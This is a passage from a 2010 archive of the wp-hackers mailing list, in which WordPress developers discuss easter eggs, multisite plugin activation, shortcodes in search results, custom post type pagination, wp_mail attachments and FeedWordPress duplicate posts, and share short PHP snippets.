In-Reply-To: <AANLkTin9QuAp48n6Z3F+qteBDtMSAtwXSQaHQadPRM_v@mail.gmail.com>
Message-ID: <C8EDAF8A.D1D1%emoya@tribune.com>

What do you mean "2010 posts"? Posts published in 2010, post with the id number "2010", etc?

If missing posts were the result of an easter egg... I wouldn't even know what to say about that. So, I'm assuming whatever your experiencing is not an easter egg.


On 10/27/10 12:18 AM, "Davit Barbakadze" <jayarjo at gmail.com> wrote:

Woa, I didn't know there were any eggs in WordPress... Is there an egg
that doesn't show 2010 posts in the admin? 'cause that what happened
to my client :D

On Mon, Oct 25, 2010 at 7:42 PM, Moya, Eddie <emoya at tribune.com> wrote:
> On 10/24/10 4:24 PM, "Eric Mann" <eric at eam.me> wrote:
>
> For the sake of argument, why don't we come up with a list of these
> "additional" features that developers might need to turn off for clients,
> bundle the code into a drop-in (as opposed to a plug-in), and allow
>         developers who need it to just deploy it on their sites?
>
> +1
>
> I just added your code to a plugin I had already written to remove the capital_P_dangit egg. I renamed the plugin "Disable All Easter Eggs". That said, I don't know of any other relevant  easter eggs than the two I just mentioned. A quick google search did not turn up any more eggs that seem to be up-to-date.
>
> If anyone knows of ANY others than the two I just mentioned, please bring it up here so we can figure out a way to turn them off via a plugin.
>
> There needs to be a simple way for people who don't know what a hook is, how to write javascript, can turn these off. Maybe if I care enough, at some point it could have a little interface so you can chose which ones to turn on or off - but for now, they will all get turned off. But if I don't get any feedback, 'All' will constitute just these two.
>
> This is the very least we can do, and possibly the only thing that can be done.
>
>
> --
> Eddie Moya
> Applications Developer
> Tribune Technology
>
>
>
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>



--
Davit Barbakadze
_______________________________________________
wp-hackers mailing list
wp-hackers at lists.automattic.com
http://lists.automattic.com/mailman/listinfo/wp-hackers



From elfin at elfden.co.uk  Wed Oct 27 15:42:30 2010
From: elfin at elfden.co.uk (Rich Pedley)
Date: Wed, 27 Oct 2010 16:42:30 +0100
Subject: [wp-hackers] Plugins can now be multisite aware
In-Reply-To: <AANLkTi=5eKBoPhqE6YY7=BHzAqjpNLncRKmvNP0EAT8e@mail.gmail.com>
References: <4CC8337C.6090607@duechiacchiere.it>
	<AANLkTi=5eKBoPhqE6YY7=BHzAqjpNLncRKmvNP0EAT8e@mail.gmail.com>
Message-ID: <4CC84866.4070106@elfden.co.uk>

On 27/10/2010 15:20, scribu wrote:
> Thank you for the kind words.
>
> Please note that it's still up to each plugin to handle network activation
> on it's own.

Do current plugins need to add anything to get this work for 
multisite? I''m not entirely sure looking at the trac ticket comments.

I currently have a routine in place where I don't think it will affect 
me too much. hopefully. with fingers crossed. and toes.

Rich

From jayarjo at gmail.com  Wed Oct 27 17:21:27 2010
From: jayarjo at gmail.com (Davit Barbakadze)
Date: Wed, 27 Oct 2010 21:21:27 +0400
Subject: [wp-hackers] "The Matrix Has You" easter egg
In-Reply-To: <C8EDAF8A.D1D1%emoya@tribune.com>
References: <AANLkTin9QuAp48n6Z3F+qteBDtMSAtwXSQaHQadPRM_v@mail.gmail.com>
	<C8EDAF8A.D1D1%emoya@tribune.com>
Message-ID: <AANLkTikW0+R1tVk30MAhyqKr3W5SB7YLLEKVXb9-T0gt@mail.gmail.com>

Right, sorry for vague statement. I was meaning posts created in 2010.
Several days ago he logged into the backend and discovered that it is
showing only 2009 posts. The interesting thing was that client-side of
the blog was still showing 2010 ones beautifully. For some time we
looked at it together. But then he tried to upgrade. And then they
disappeared even form the front-end. He was quite frightened, so I
recommended to degrade back, but despite of me telling him to backup
everything, and backup it twice, and then backup again, just overwrote
the whole thing...

So... easter eggs... or no, but illogical behavior on WordPress side
may easily bring non-techy users to a catastrophe.

On Wed, Oct 27, 2010 at 7:29 PM, Moya, Eddie <emoya at tribune.com> wrote:
> What do you mean "2010 posts"? Posts published in 2010, post with the id number "2010", etc?
>
> If missing posts were the result of an easter egg... I wouldn't even know what to say about that. So, I'm assuming whatever your experiencing is not an easter egg.
>
>
> On 10/27/10 12:18 AM, "Davit Barbakadze" <jayarjo at gmail.com> wrote:
>
> Woa, I didn't know there were any eggs in WordPress... Is there an egg
> that doesn't show 2010 posts in the admin? 'cause that what happened
> to my client :D
>
> On Mon, Oct 25, 2010 at 7:42 PM, Moya, Eddie <emoya at tribune.com> wrote:
>> On 10/24/10 4:24 PM, "Eric Mann" <eric at eam.me> wrote:
>>
>> For the sake of argument, why don't we come up with a list of these
>> "additional" features that developers might need to turn off for clients,
>> bundle the code into a drop-in (as opposed to a plug-in), and allow
>> ? ? ? ? developers who need it to just deploy it on their sites?
>>
>> +1
>>
>> I just added your code to a plugin I had already written to remove the capital_P_dangit egg. I renamed the plugin "Disable All Easter Eggs". That said, I don't know of any other relevant ?easter eggs than the two I just mentioned. A quick google search did not turn up any more eggs that seem to be up-to-date.
>>
>> If anyone knows of ANY others than the two I just mentioned, please bring it up here so we can figure out a way to turn them off via a plugin.
>>
>> There needs to be a simple way for people who don't know what a hook is, how to write javascript, can turn these off. Maybe if I care enough, at some point it could have a little interface so you can chose which ones to turn on or off - but for now, they will all get turned off. But if I don't get any feedback, 'All' will constitute just these two.
>>
>> This is the very least we can do, and possibly the only thing that can be done.
>>
>>
>> --
>> Eddie Moya
>> Applications Developer
>> Tribune Technology
>>
>>
>>
>> _______________________________________________
>> wp-hackers mailing list
>> wp-hackers at lists.automattic.com
>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>>
>
>
>
> --
> Davit Barbakadze
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>
>
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>



-- 
Davit Barbakadze

From mail at scribu.net  Wed Oct 27 17:22:58 2010
From: mail at scribu.net (scribu)
Date: Wed, 27 Oct 2010 20:22:58 +0300
Subject: [wp-hackers] Plugins can now be multisite aware
In-Reply-To: <4CC84866.4070106@elfden.co.uk>
References: <4CC8337C.6090607@duechiacchiere.it>
	<AANLkTi=5eKBoPhqE6YY7=BHzAqjpNLncRKmvNP0EAT8e@mail.gmail.com>
	<4CC84866.4070106@elfden.co.uk>
Message-ID: <AANLkTikL3=HML+qAw1oAH3P5zyJHyZfh+74LL0Nu7rMn@mail.gmail.com>

On Wed, Oct 27, 2010 at 6:42 PM, Rich Pedley <elfin at elfden.co.uk> wrote:

> On 27/10/2010 15:20, scribu wrote:
>
>> Thank you for the kind words.
>>
>> Please note that it's still up to each plugin to handle network activation
>> on it's own.
>>
>
> Do current plugins need to add anything to get this work for multisite?
> I''m not entirely sure looking at the trac ticket comments.
>

Yes, they need to do their activation routine for each site, using
switch_to_blog()

I'm still considering automating that part.

From elfin at elfden.co.uk  Wed Oct 27 18:27:58 2010
From: elfin at elfden.co.uk (Rich Pedley)
Date: Wed, 27 Oct 2010 19:27:58 +0100
Subject: [wp-hackers] Plugins can now be multisite aware
In-Reply-To: <AANLkTikL3=HML+qAw1oAH3P5zyJHyZfh+74LL0Nu7rMn@mail.gmail.com>
References: <4CC8337C.6090607@duechiacchiere.it>	<AANLkTi=5eKBoPhqE6YY7=BHzAqjpNLncRKmvNP0EAT8e@mail.gmail.com>	<4CC84866.4070106@elfden.co.uk>
	<AANLkTikL3=HML+qAw1oAH3P5zyJHyZfh+74LL0Nu7rMn@mail.gmail.com>
Message-ID: <4CC86F2E.4060906@elfden.co.uk>

On 27/10/2010 18:22, scribu wrote:
> On Wed, Oct 27, 2010 at 6:42 PM, Rich Pedley<elfin at elfden.co.uk>  wrote:
>
>> On 27/10/2010 15:20, scribu wrote:
>>
>>> Thank you for the kind words.
>>>
>>> Please note that it's still up to each plugin to handle network activation
>>> on it's own.
>>>
>>
>> Do current plugins need to add anything to get this work for multisite?
>> I''m not entirely sure looking at the trac ticket comments.
>>
>
> Yes, they need to do their activation routine for each site, using
> switch_to_blog()
>
> I'm still considering automating that part.

I'll wait then... I'm in the lucky situation where I had help coding 
things for MU, so in theory it's still working ok for multisite.

Rich

From me at olumidealabi.com  Thu Oct 28 09:18:24 2010
From: me at olumidealabi.com (Olumide Alabi)
Date: Thu, 28 Oct 2010 10:18:24 +0100
Subject: [wp-hackers] Permalinks, Custom Post Types & Pagination
In-Reply-To: <AANLkTin646EbEQ-UyrRHAzTEZQntjyLyQ+ZkrTVLtaUq@mail.gmail.com>
References: <AANLkTi=GXh1K3-_73-=9TzxELQ7jV=ofHm8KzL3d9s-y@mail.gmail.com>
	<AANLkTin74J6sgKdP-2Yu7VnFTH2t4eUYrEc9ga=hxxDq@mail.gmail.com>
	<AANLkTinU8uGZjFikt6Y+-d7x-JAf6mCbRatk7N_V99Bi@mail.gmail.com>
	<AANLkTinywc5zkQ9owxtYn4CmBwjEu0PP3cAKXGCJerTE@mail.gmail.com>
	<AANLkTinN2y2L0ofrqrWXotP8dyZdSFTEp29xui2RP-=Z@mail.gmail.com>
	<AANLkTi=LhDo6Naa-YgR6Q0RoGZX60w6eenTdSd=Ttv==@mail.gmail.com>
	<AANLkTin646EbEQ-UyrRHAzTEZQntjyLyQ+ZkrTVLtaUq@mail.gmail.com>
Message-ID: <AANLkTin=eSeaTgcPDsi4Lzp7wKsQXFkRJ9QOn4tokWNQ@mail.gmail.com>

Hi Guys,
I finally fixed it. It's really funny how a single 's' can mess things up.

I just changed the *query_var* property for the post type from
press-releases to press-release and flushed my rewrite rules and it worked
like a charm.

Here's a link if you need to reference the solution.
http://wordpress.org/support/topic/pagination-for-custom-post-types

-- 
Best Regards

Olumide Alabi
Mobile | +234 802 359 9606
CDMA | +234 702 838 6589
<http://www.holidaysandcash.com/luminus>
Chat [image: Google Talk:] luminusdadon [image: Skype:] luminusdadon
Contact Me [image: Linkedin] <http://www.linkedin.com/in/luminus>[image:
Facebook] <http://www.facebook.com/luminus>[image:
Tumblr]<http://luminus.tumblr.com>[image:
Twitter] <http://twitter.com/luminus>

From 24-7 at gmx.net  Thu Oct 28 11:55:28 2010
From: 24-7 at gmx.net (24/7)
Date: Thu, 28 Oct 2010 04:55:28 -0700 (PDT)
Subject: [wp-hackers] how to avoid [shortcodes] appearing in search link
	results?
Message-ID: <4d282bcc-025f-44f9-8662-8cbcd605fe1c@30g2000yql.googlegroups.com>

I currently use a whole set of shortcodes to give the client the
possibility to style the content as easy as possible. My only problem
with using shortcodes is that they appear in search engine results as
plain text.

Ex.
"Welcome to company XY [logo] blabla [line] [list] bla [/list] bla"

I have thought about this for quite a time now, but i can't imagine
any way around. Somebody got an idea on how to avoid this?

Thanks!
- K.

From frank at bueltge.de  Thu Oct 28 12:53:08 2010
From: frank at bueltge.de (Frank Bueltge)
Date: Thu, 28 Oct 2010 14:53:08 +0200
Subject: [wp-hackers] how to avoid [shortcodes] appearing in search link
	results?
In-Reply-To: <4d282bcc-025f-44f9-8662-8cbcd605fe1c@30g2000yql.googlegroups.com>
References: <4d282bcc-025f-44f9-8662-8cbcd605fe1c@30g2000yql.googlegroups.com>
Message-ID: <AANLkTikrwfBbtOaj8u=-0vT4-fgSynKz8vZp5Hzt5YK_@mail.gmail.com>

You must add filter the function for shortcodes do_shortcode to the search
result.
maybe:
add_filter( 'get_search_query', 'do_shortocode' );
But i have not test this.

Best regards
Frank

From ana.aires at gmail.com  Thu Oct 28 16:30:57 2010
From: ana.aires at gmail.com (Ana Aires)
Date: Thu, 28 Oct 2010 17:30:57 +0100
Subject: [wp-hackers] Custom Post Types and Taxonomy
Message-ID: <AANLkTimqeW2Msygf+qVYZZ5T9+MmwOz2LUTTwcEdYrCF@mail.gmail.com>

Hi everyone,

I have defined a new custom post type and assigned a new taxonomy, to it. I
would like to define as default 2 terms of this taxonomy when a new post is
created. Any ideas on how I can accomplish this?

There is the "Default Post Category" under Settings>Writing I would like to
perform the same but associate to a new post type a new term.

Hope you can help.... I am getting nuts with this!
-- 
Ana Aires

From goldenapplesdesign at gmail.com  Thu Oct 28 22:00:39 2010
From: goldenapplesdesign at gmail.com (Nathaniel Taintor)
Date: Thu, 28 Oct 2010 15:00:39 -0700
Subject: [wp-hackers] how to avoid [shortcodes] appearing in search link
	results?
In-Reply-To: <4d282bcc-025f-44f9-8662-8cbcd605fe1c@30g2000yql.googlegroups.com>
References: <4d282bcc-025f-44f9-8662-8cbcd605fe1c@30g2000yql.googlegroups.com>
Message-ID: <AANLkTikg_Yj_0roSCoyNVzp16r+pkPZvmgHRJQyZr=wO@mail.gmail.com>

Are you talking about the results returned by your search.php template, or
the results that show up in Google?

If its your internal search - ie search.php results - a simple the_excerpt()
or apply_filters( 'the_excerpt', $your_excerpt ) in the right place should
do what you want and strip out shortcode tags.

If its the descriptions that are showing up in search engines, then check
the meta description tag in your header template file. Most likely you're
accessing $post->post_content directly, which is dangerous in meta content.
Use the_excerpt() there as well, for filter it in some way.

In any case, I don't think this is the right place for this question... Try
the support forums, and give some examples of the code you're working with
and the results you're getting, and you should be able to get a good
answer...


Nathaniel Taintor, Designer/Developer
*Golden Apples Design*
http://goldenapplesdesign.com

@GoldenApples | 503.877.2880
goldenapplesdesign at gmail.com



On Thu, Oct 28, 2010 at 4:55 AM, 24/7 <24-7 at gmx.net> wrote:

> I currently use a whole set of shortcodes to give the client the
> possibility to style the content as easy as possible. My only problem
> with using shortcodes is that they appear in search engine results as
> plain text.
>
> Ex.
> "Welcome to company XY [logo] blabla [line] [list] bla [/list] bla"
>
> I have thought about this for quite a time now, but i can't imagine
> any way around. Somebody got an idea on how to avoid this?
>
> Thanks!
> - K.
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From 24-7 at gmx.net  Fri Oct 29 15:37:31 2010
From: 24-7 at gmx.net (24/7)
Date: Fri, 29 Oct 2010 08:37:31 -0700 (PDT)
Subject: [wp-hackers] how to avoid [shortcodes] appearing in search link
	results?
In-Reply-To: <AANLkTikg_Yj_0roSCoyNVzp16r+pkPZvmgHRJQyZr=wO@mail.gmail.com>
References: <4d282bcc-025f-44f9-8662-8cbcd605fe1c@30g2000yql.googlegroups.com>
	<AANLkTikg_Yj_0roSCoyNVzp16r+pkPZvmgHRJQyZr=wO@mail.gmail.com>
Message-ID: <b80951de-93a1-4539-a6dd-a68b7d04e6c2@l20g2000yqm.googlegroups.com>

Hey, thanks for your answers!

@Nathaniel:
- I'm talking about "search engine results" (ex. Google).
- A simple Code example:
[code]
	// Things that, for a non tech savy client, would else be confusing,
so we do it via a short code
	// Clear-span
	add_shortcode('break', 'make_a_break');
	function make_a_break() {
		return '<span class="clear">&nbsp;</span>';
	}
	// hr
	add_shortcode('linie', 'make_a_line');
	function make_a_line() {
		return '<hr />';
	}
[/code]
- About the meta-content: That was the problem. I wasn't aware of
this. Thanks!
- I wasn't sure if this is a bug or some mistake on my side. It didn't
fit, so: Sry for posting it here.

From aaron at xavisys.com  Fri Oct 29 16:50:48 2010
From: aaron at xavisys.com (Aaron D. Campbell)
Date: Fri, 29 Oct 2010 09:50:48 -0700
Subject: [wp-hackers] Permalinks, Custom Post Types & Pagination
In-Reply-To: <AANLkTin=eSeaTgcPDsi4Lzp7wKsQXFkRJ9QOn4tokWNQ@mail.gmail.com>
References: <AANLkTi=GXh1K3-_73-=9TzxELQ7jV=ofHm8KzL3d9s-y@mail.gmail.com>	<AANLkTin74J6sgKdP-2Yu7VnFTH2t4eUYrEc9ga=hxxDq@mail.gmail.com>	<AANLkTinU8uGZjFikt6Y+-d7x-JAf6mCbRatk7N_V99Bi@mail.gmail.com>	<AANLkTinywc5zkQ9owxtYn4CmBwjEu0PP3cAKXGCJerTE@mail.gmail.com>	<AANLkTinN2y2L0ofrqrWXotP8dyZdSFTEp29xui2RP-=Z@mail.gmail.com>	<AANLkTi=LhDo6Naa-YgR6Q0RoGZX60w6eenTdSd=Ttv==@mail.gmail.com>	<AANLkTin646EbEQ-UyrRHAzTEZQntjyLyQ+ZkrTVLtaUq@mail.gmail.com>
	<AANLkTin=eSeaTgcPDsi4Lzp7wKsQXFkRJ9QOn4tokWNQ@mail.gmail.com>
Message-ID: <4CCAFB68.4070404@xavisys.com>

If you're slug for the custom post type matches the slug for the page 
you're using as the index (list) for the custom post type, there's a 
conflict.  For example, if you use 'beer' as a custom post type, and 
'beer' as the slug for the page that lists them, the url '/beer/page/2' 
is looking for the beer with the slug 'page' rather than passing 'page 
2' to the 'beer' page.  I fixed this by reordering the rewrite rules 
like this:

    add_filter( 'page_rewrite_rules',  array( $this,
    'get_beer_page_rewrite_rules' ) );
    add_filter( 'rewrite_rules_array', array( $this,
    'add_beer_page_rewrite_rules' ) );
    public function get_beer_page_rewrite_rules($rewrites) {
         foreach ( $rewrites as $rule_key => $rule) {
             if ( false !== strpos($rule_key, 'beer') ) {
                 $this->_beer_page_rewrite_rules[$rule_key] = $rule;
                 unset($rewrites[$rule_key]);
             }
         }
         return $rewrites;
    }

    public function add_beer_page_rewrite_rules($rewrites) {
         $rewrites = array_merge($this->_beer_page_rewrite_rules,
    $rewrites);
         return $rewrites;
    }

Basically, get_beer_page_rewrite_rules() takes out the beer page 
rewrites and stores them in a class variable (you can obviously put them 
anywhere, this is a snippet from a class in a plugin I use to run 
http://shouldipoutit.com).  Then add_beer_page_rewrite_rules() adds them 
back at the top of the rewrites, ahead of the custom post type rewrites 
that overlap it.

The advantage is that the slug can match and page number is passed where 
you expect.  The disadvantage is that you can't have a beer with a slug 
'page'.  You can't have everything!

Hopefully that helps anyone else that comes across this issue.

On 10/28/2010 2:18 AM, Olumide Alabi wrote:
> Hi Guys,
> I finally fixed it. It's really funny how a single 's' can mess things up.
>
> I just changed the *query_var* property for the post type from
> press-releases to press-release and flushed my rewrite rules and it worked
> like a charm.
>
> Here's a link if you need to reference the solution.
> http://wordpress.org/support/topic/pagination-for-custom-post-types
>

-- 

Aaron D. Campbell
Owner
*Xavisys <http://xavisys.com>*

Cell: 619-889-3033
Fax: 623-327-0562


From autremonde75 at gmail.com  Fri Oct 29 19:25:24 2010
From: autremonde75 at gmail.com (Olivier)
Date: Fri, 29 Oct 2010 12:25:24 -0700 (PDT)
Subject: [wp-hackers] wp_mail with string attachment
Message-ID: <349818f3-1a91-400a-9904-9519dd7a2327@32g2000yqz.googlegroups.com>

Hello,

I'd like to use the wp_mail() function with string attachment feature
of PHPMailer class. This would allow me to pass on directly the
content I want to attach without having to go through a temp file
creation which can result into problems if the directory isn't
writable.

Is there a way to achieve this?

Thanks!

Olivier

From mda at blogwaffe.com  Sat Oct 30 02:05:40 2010
From: mda at blogwaffe.com (Michael D Adams)
Date: Fri, 29 Oct 2010 19:05:40 -0700
Subject: [wp-hackers] wp_mail with string attachment
In-Reply-To: <349818f3-1a91-400a-9904-9519dd7a2327@32g2000yqz.googlegroups.com>
References: <349818f3-1a91-400a-9904-9519dd7a2327@32g2000yqz.googlegroups.com>
Message-ID: <AANLkTikZ9dhevRfxDocupGGKOBRLXWpS68Wd7YRmJR8a@mail.gmail.com>

On Fri, Oct 29, 2010 at 12:25 PM, Olivier <autremonde75 at gmail.com> wrote:
> Hello,
>
> I'd like to use the wp_mail() function with string attachment feature
> of PHPMailer class. This would allow me to pass on directly the
> content I want to attach without having to go through a temp file
> creation which can result into problems if the directory isn't
> writable.
>
> Is there a way to achieve this?

I don't know anything about the attachment feature you want to use,
but the phpmailer_init hook called from wp_mail() gives you complete
access to the $phpmailer object.

Mike

From mark at simplercomputing.net  Sat Oct 30 04:10:45 2010
From: mark at simplercomputing.net (Mark E)
Date: Fri, 29 Oct 2010 22:10:45 -0600
Subject: [wp-hackers] wp_mail with string attachment
In-Reply-To: <AANLkTikZ9dhevRfxDocupGGKOBRLXWpS68Wd7YRmJR8a@mail.gmail.com>
References: <349818f3-1a91-400a-9904-9519dd7a2327@32g2000yqz.googlegroups.com>
	<AANLkTikZ9dhevRfxDocupGGKOBRLXWpS68Wd7YRmJR8a@mail.gmail.com>
Message-ID: <4CCB9AC5.1080906@simplercomputing.net>

Cross-reference the documentation for PHPMailer out there on the net.

Mark

On 10/29/2010 08:05 PM, Michael D Adams wrote:
> On Fri, Oct 29, 2010 at 12:25 PM, Olivier<autremonde75 at gmail.com>  wrote:
>> Hello,
>>
>> I'd like to use the wp_mail() function with string attachment feature
>> of PHPMailer class. This would allow me to pass on directly the
>> content I want to attach without having to go through a temp file
>> creation which can result into problems if the directory isn't
>> writable.
>>
>> Is there a way to achieve this?

From dvmorris at gmail.com  Sat Oct 30 05:47:56 2010
From: dvmorris at gmail.com (David Morris)
Date: Sat, 30 Oct 2010 00:47:56 -0500
Subject: [wp-hackers] FeedWordPress duplicated posts problem
Message-ID: <AANLkTi=po=tzwqaQJz7Frv4qLbW2Qi5ZzxC1h+xDHYPL@mail.gmail.com>

I apologize in advance for asking about a specific plugin here, but I don't
know where else to go for help. FeedWordPress is pulling in two, three,
four, and as many as 15 copies of the same post when it updates (via manual
cron triggers or via auto updates).

It doesn't happen all the time, and it doesn't happen with every post. I
also noticed that it occasionally says that a FWP post was "created locally
on this site", even though it wasn't. Copies of that same post will
sometimes say "local", and sometimes "syndicated". And one more strange
behavior, it's actually posting stuff from one domain into another
completely different domain, but it only seems to pull the post_title
across, no content or categories.

I'm on a WP Multi-site 3.0.1 install with FWP v2010.0905. I'm also using WP
Super Cache if that might make a difference. Has anyone experienced any of
this before? Does the duplicated posts FWP filter work properly?

Thanks for your help,

-- 
Dave Morris
http://dave.showviz.net/
http://3dcamphouston.com/

From anthony at radiopicture.com.au  Sat Oct 30 05:58:55 2010
From: anthony at radiopicture.com.au (Anthony Cole)
Date: Sat, 30 Oct 2010 16:58:55 +1100
Subject: [wp-hackers] FeedWordPress duplicated posts problem
In-Reply-To: <AANLkTi=po=tzwqaQJz7Frv4qLbW2Qi5ZzxC1h+xDHYPL@mail.gmail.com>
References: <AANLkTi=po=tzwqaQJz7Frv4qLbW2Qi5ZzxC1h+xDHYPL@mail.gmail.com>
Message-ID: <571541F5-4062-44DC-948C-232557B14816@radiopicture.com.au>

I'm having this same problem with a client right now myself. Does anybody have any ideas as to what's causing this?

-ac

On 30/10/2010, at 4:47 PM, David Morris wrote:

> I apologize in advance for asking about a specific plugin here, but I don't
> know where else to go for help. FeedWordPress is pulling in two, three,
> four, and as many as 15 copies of the same post when it updates (via manual
> cron triggers or via auto updates).
> 
> It doesn't happen all the time, and it doesn't happen with every post. I
> also noticed that it occasionally says that a FWP post was "created locally
> on this site", even though it wasn't. Copies of that same post will
> sometimes say "local", and sometimes "syndicated". And one more strange
> behavior, it's actually posting stuff from one domain into another
> completely different domain, but it only seems to pull the post_title
> across, no content or categories.
> 
> I'm on a WP Multi-site 3.0.1 install with FWP v2010.0905. I'm also using WP
> Super Cache if that might make a difference. Has anyone experienced any of
> this before? Does the duplicated posts FWP filter work properly?
> 
> Thanks for your help,
> 
> -- 
> Dave Morris
> http://dave.showviz.net/
> http://3dcamphouston.com/
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers


From autremonde75 at gmail.com  Sat Oct 30 08:30:50 2010
From: autremonde75 at gmail.com (Olivier)
Date: Sat, 30 Oct 2010 01:30:50 -0700 (PDT)
Subject: [wp-hackers] wp_mail with string attachment
In-Reply-To: <AANLkTikZ9dhevRfxDocupGGKOBRLXWpS68Wd7YRmJR8a@mail.gmail.com>
References: <349818f3-1a91-400a-9904-9519dd7a2327@32g2000yqz.googlegroups.com>
	<AANLkTikZ9dhevRfxDocupGGKOBRLXWpS68Wd7YRmJR8a@mail.gmail.com>
Message-ID: <18717873-3204-40a4-b60b-bf8a350cf118@n3g2000yqa.googlegroups.com>

Thanks for your answer! I saw this action hook. The issue is that I
don't see how to pass parameters to it. I could use this one to pass
on my string attachment, this is probably the right place but how can
I pass on my parameters (ie the string attachment content) through
this action hook?

Thanks!

Olivier

On Oct 30, 4:05?am, Michael D Adams <m... at blogwaffe.com> wrote:
> On Fri, Oct 29, 2010 at 12:25 PM, Olivier <autremond... at gmail.com> wrote:
> > Hello,
>
> > I'd like to use the wp_mail() function with string attachment feature
> > of PHPMailer class. This would allow me to pass on directly the
> > content I want to attach without having to go through a temp file
> > creation which can result into problems if the directory isn't
> > writable.
>
> > Is there a way to achieve this?
>
> I don't know anything about the attachment feature you want to use,
> but the phpmailer_init hook called from wp_mail() gives you complete
> access to the $phpmailer object.
>
> Mike
> _______________________________________________
> wp-hackers mailing list
> wp-hack... at lists.automattic.comhttp://lists.automattic.com/mailman/listinfo/wp-hackers

From harish.mlists at gmail.com  Sat Oct 30 15:41:32 2010
From: harish.mlists at gmail.com (Harish Narayanan)
Date: Sat, 30 Oct 2010 17:41:32 +0200
Subject: [wp-hackers] Small patch for wp-admin/edit.php validation
Message-ID: <4CCC3CAC.5020107@gmail.com>

I have attached a small patch that fixes the XHTML markup when loading
wp-admin/edit.php, allowing my browser to render the page.

I have also created a ticket for this on WordPress' Trac:
http://core.trac.wordpress.org/ticket/15260

Perhaps someone else who's run into this issue will find it helpful.

Harish



-------------- next part --------------
An embedded and charset-unspecified text was scrubbed...
Name: edit.patch
URL: <http://lists.automattic.com/pipermail/wp-hackers/attachments/20101030/80099b2d/attachment.asc>

From banago at gmail.com  Sat Oct 30 15:50:49 2010
From: banago at gmail.com (Baki Goxhaj)
Date: Sat, 30 Oct 2010 17:50:49 +0200
Subject: [wp-hackers] WP_DEBUG Notice
Message-ID: <AANLkTikAttQXeXH7OrGTDfTssz+Rmi3kmccoM58A0GE7@mail.gmail.com>

I'm developing a theme and I'm getting this notice only when I visit a page.
this does not show up on homepage or posts.
*
*
>
> *Notice*: Only variables should be assigned by reference in *
> /homepages/38/d285591449/htdocs/owsh.org/new/wp-includes/query.php* on
> line *1508*
>

Here is the code from query.php:

        if ( '' != $qv['pagename'] ) {
            $this->queried_object =& get_page_by_path($qv['pagename']); *->This
is line 1508*
            if ( !empty($this->queried_object) )
                $this->queried_object_id = (int) $this->queried_object->ID;
            else*

*What can be causing this.

Kindly,

Baki Goxhaj
www.wplancer.com | www.banago.info | www.lintuts.com

From wp at andrewnacin.com  Sat Oct 30 18:29:56 2010
From: wp at andrewnacin.com (Andrew Nacin)
Date: Sat, 30 Oct 2010 14:29:56 -0400
Subject: [wp-hackers] WP_DEBUG Notice
In-Reply-To: <AANLkTikAttQXeXH7OrGTDfTssz+Rmi3kmccoM58A0GE7@mail.gmail.com>
References: <AANLkTikAttQXeXH7OrGTDfTssz+Rmi3kmccoM58A0GE7@mail.gmail.com>
Message-ID: <AANLkTimRHnp=py1TU0NuCgfjae2N8a-RcKWX7HgJ5ZGS@mail.gmail.com>

On Sat, Oct 30, 2010 at 11:50 AM, Baki Goxhaj <banago at gmail.com> wrote:

> I'm developing a theme and I'm getting this notice only when I visit a
> page.
> this does not show up on homepage or posts.
> *
> *
> >
> > *Notice*: Only variables should be assigned by reference in *
> > /homepages/38/d285591449/htdocs/owsh.org/new/wp-includes/query.php* on
> > line *1508*
>

If you test this on trunk, revision 16104, I think I've addressed the issue.

From lox.dev at knc.nc  Sun Oct 31 01:26:19 2010
From: lox.dev at knc.nc (Lox)
Date: Sun, 31 Oct 2010 12:26:19 +1100
Subject: [wp-hackers] wp_mail with string attachment
In-Reply-To: <18717873-3204-40a4-b60b-bf8a350cf118@n3g2000yqa.googlegroups.com>
References: <349818f3-1a91-400a-9904-9519dd7a2327@32g2000yqz.googlegroups.com>
	<AANLkTikZ9dhevRfxDocupGGKOBRLXWpS68Wd7YRmJR8a@mail.gmail.com>
	<18717873-3204-40a4-b60b-bf8a350cf118@n3g2000yqa.googlegroups.com>
Message-ID: <AANLkTik7OTDRcWOmLJJQRwJWd5oPYpBsLh0gekbojChz@mail.gmail.com>

When a hook doesn t allows enought arguments, you can use a global var.
(Ugly hack, I know)

Lox
Le 30 oct. 2010 20:31, "Olivier" <autremonde75 at gmail.com> a ?crit :
> Thanks for your answer! I saw this action hook. The issue is that I
> don't see how to pass parameters to it. I could use this one to pass
> on my string attachment, this is probably the right place but how can
> I pass on my parameters (ie the string attachment content) through
> this action hook?
>
> Thanks!
>
> Olivier
>
> On Oct 30, 4:05 am, Michael D Adams <m... at blogwaffe.com> wrote:
>> On Fri, Oct 29, 2010 at 12:25 PM, Olivier <autremond... at gmail.com> wrote:
>> > Hello,
>>
>> > I'd like to use the wp_mail() function with string attachment feature
>> > of PHPMailer class. This would allow me to pass on directly the
>> > content I want to attach without having to go through a temp file
>> > creation which can result into problems if the directory isn't
>> > writable.
>>
>> > Is there a way to achieve this?
>>
>> I don't know anything about the attachment feature you want to use,
>> but the phpmailer_init hook called from wp_mail() gives you complete
>> access to the $phpmailer object.
>>
>> Mike
>> _______________________________________________
>> wp-hackers mailing list
>> wp-hack... at lists.automattic.comhttp://
lists.automattic.com/mailman/listinfo/wp-hackers
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers

From autremonde75 at gmail.com  Sun Oct 31 08:51:00 2010
From: autremonde75 at gmail.com (Olivier)
Date: Sun, 31 Oct 2010 01:51:00 -0700 (PDT)
Subject: [wp-hackers] wp_mail with string attachment
In-Reply-To: <AANLkTik7OTDRcWOmLJJQRwJWd5oPYpBsLh0gekbojChz@mail.gmail.com>
References: <349818f3-1a91-400a-9904-9519dd7a2327@32g2000yqz.googlegroups.com>
	<AANLkTikZ9dhevRfxDocupGGKOBRLXWpS68Wd7YRmJR8a@mail.gmail.com>
	<18717873-3204-40a4-b60b-bf8a350cf118@n3g2000yqa.googlegroups.com>
